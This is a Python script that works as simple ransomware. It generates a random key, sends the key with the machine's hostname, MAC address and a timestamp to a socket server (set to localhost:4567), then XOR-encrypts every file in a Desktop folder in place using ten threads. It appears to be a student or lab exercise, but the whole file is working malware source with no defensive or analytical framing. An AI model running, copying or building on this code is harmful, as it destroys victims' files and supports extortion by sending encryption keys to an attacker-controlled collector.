import socket
import os
import threading
import queue
import random
import getmac
from datetime import datetime


# Encryption function
def encrypt(key):
    while True:
        file = q.get()
        print(f'Encrypting {file}')
        try:
            keyIndex = 0
            maxKeyIndex = len(key) - 1
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')
            for byte in data:
                xorByte = byte ^ ord(key[keyIndex])
                with open(file, 'ab') as f:
                    f.write(xorByte.to_bytes(1, 'little'))
                # increment key index
                if keyIndex >= maxKeyIndex:
                    keyIndex = 0
                else:
                    keyIndex += 1
            print(f'{file} encrypted')
        except:
            print('Unable to encrypt file')
        q.task_done()


# socket address and port
IP_ADDRESS = 'localhost'
PORT = 4567

# Key information
# lenght of the generated key in bytes
keySize = 32
keyChars = '<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
keyCharLenght = len(keyChars)

# Encryption filepath
print("Preparing files")
encryptionPath = os.environ['USERPROFILE'] + '\\Desktop\\Desktop'
files = os.listdir(encryptionPath)
absFiles = []
for f in files:
    absFiles.append(encryptionPath + '\\' + f)
print("All files in " + encryptionPath + "detected")

# Get computer information
hostname = os.getenv('COMPUTERNAME')
macAddress = getmac.get_mac_address()
now = datetime.now()

# Generating key
key = ''
for i in range(keySize):
    key += keyChars[random.randint(0, keyCharLenght - 1)]
print("Encryption Key Generated")

# connect to server and send key, hostname and mac address
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP_ADDRESS, PORT))
    print('Connected to the server.')
    print('Transmitting hostname, key and mac address and Time of Encryption')
    s.send(f'{hostname} : {macAddress} : {now} : {key}'.encode('utf-8'))
    print('Transmission completed.')
    s.close()

# Creates a queue of files to be encrypted
q = queue.Queue()
for f in absFiles:
    q.put(f)

# set up threads and start them
for i in range(10):
    t = threading.Thread(target=encrypt, args=(key,))
    t.daemon = True
    t.start()

q.join()
print('Encryption Completed')
input()
